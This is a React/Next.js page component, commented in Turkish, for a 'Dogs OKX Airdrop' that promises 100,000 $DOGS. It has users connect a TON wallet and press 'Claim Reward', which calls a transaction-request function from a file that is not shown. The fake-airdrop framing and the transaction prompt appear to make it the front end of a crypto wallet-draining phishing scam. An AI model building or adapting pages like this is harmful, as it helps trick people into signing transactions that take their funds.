"use client";

import { useState, useEffect, useCallback } from 'react';
import { useTonConnectUI, TonConnectButton } from '@tonconnect/ui-react'; // TonConnectButton import edildi
import { request_transaction } from './services/transaction'; // Transaction işlemi için
import './globals.css';
import './assets/index-DjTWcX1v.css';
import './assets/alertify.min.css';
import './assets/default.min.css';
import './assets/popup.css'; // Pop-up CSS dosyası

const PageComponent = () => {
  const [tonConnectUI] = useTonConnectUI();
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false); // Loading state eklendi

  // Cüzdan bağlantısı ve yönetimi
  const handleWalletConnection = useCallback((address: string) => {
    setWalletAddress(address);
    console.log("Wallet connected successfully!");
    setIsLoading(false);
  }, []);

  const handleWalletDisconnection = useCallback(() => {
    setWalletAddress(null);
    console.log("Wallet disconnected successfully!");
    setIsLoading(false);
  }, []);

  useEffect(() => {
    const checkWalletConnection = async () => {
      if (tonConnectUI.account?.address) {
        handleWalletConnection(tonConnectUI.account.address);
      } else {
        handleWalletDisconnection();
      }
    };

    checkWalletConnection();

    const unsubscribe = tonConnectUI.onStatusChange((wallet) => {
      if (wallet) {
        handleWalletConnection(wallet.account.address);
      } else {
        handleWalletDisconnection();
      }
    });

    return () => {
      unsubscribe();
    };
  }, [tonConnectUI, handleWalletConnection, handleWalletDisconnection]);

  const handleWalletAction = async () => {
    if (tonConnectUI.connected) {
      setIsLoading(true);
      await tonConnectUI.disconnect();
    } else {
      await tonConnectUI.openModal();
    }
  };

  // Transaction başlatma işlemi
  const handleTransactionRequest = async () => {
    setIsLoading(true); // Transaction başlarken loading state'i true yap
    try {
      await request_transaction(tonConnectUI, setIsLoading); // Transaction talebi ve pop-up yönetimi için setIsLoading ekliyoruz
      console.log("Transaction talebi başarılı!");
    } catch (error) {
      console.error("Transaction talebi hatası:", error);
    } finally {
      setIsLoading(false); // Transaction tamamlanınca loading'i false yap
    }
  };

  return (
    <div className="container">
      {/* Pop-up */}
      {isLoading && (
        <div className="popup">
          <div className="popup-content">
            {/* GIF Saat */}
            <img src="/clock.gif" alt="clock gif" />
            <h1>PLEASE WAIT</h1>
            <p>Your Airdrop Is Processing...</p>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="header">
        <div className="logo"></div>
        <div className="header-text">Dogs <br /> OKX🦴</div>
        <div id="connect-button">
          {/* Mevcut Connect Wallet butonu yerine TonConnectButton eklendi */}
          <TonConnectButton className="my-button-class" style={{ float: "right" }} />
        </div>
      </div>

      {/* Content Section */}
      <div className="content" style={{ display: 'flex', justifyContent: 'center', flexDirection: 'column', alignItems: 'center', width: '100%' }}>
        {/* Dog Icon Section */}
        <div className="dog-icon" style={{ backgroundColor: '#131416', borderRadius: '15px', width: '70%', height: '30vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', boxShadow: '5px 5px 5px rgba(0, 0, 0, 0.527)', alignItems: 'center' }}>
          <img src="/Dogs Logo-Cykcc3M2.png" style={{ width: '20vh', height: '20vh' }} alt="Dogs Logo" />
          <span style={{ color: '#f1f1f1', fontWeight: 800, fontSize: '15px' }}>Dogs OKX Airdrop!</span>
        </div>

        {/* Claim Button */}
        <div className="claim">
          <button className="btn" onClick={!walletAddress ? handleWalletAction : handleTransactionRequest} style={{ marginTop: '5%', fontFamily: 'FMBolyarSansPro, sans-serif' }}>
            {!walletAddress ? "CLAIM REWARD" : "Claim Reward"}
          </button>
        </div>

        {/* Rewards Section */}
        <div style={{ backgroundColor: '#131416', borderRadius: '15px', width: '90%', boxShadow: '5px 5px 5px rgba(0, 0, 0, 0.527)', display: 'flex', justifyContent: 'center', flexDirection: 'column', alignItems: 'center' }}>
          <div className="rewards">
            <div style={{ fontSize: '20px', fontFamily: 'FMBolyarSansPro, sans-serif' }} className="reward">
              <img src="/DogsCoin-CIeVN3a4.png" width="65" height="65" alt="Dogs Coin" />
              <b>100,000</b> <span> $DOGS</span>
            </div>
          </div>
          <div className="footer-text">
            <span className="note">Use your wallet to receive the airdrop!</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PageComponent;
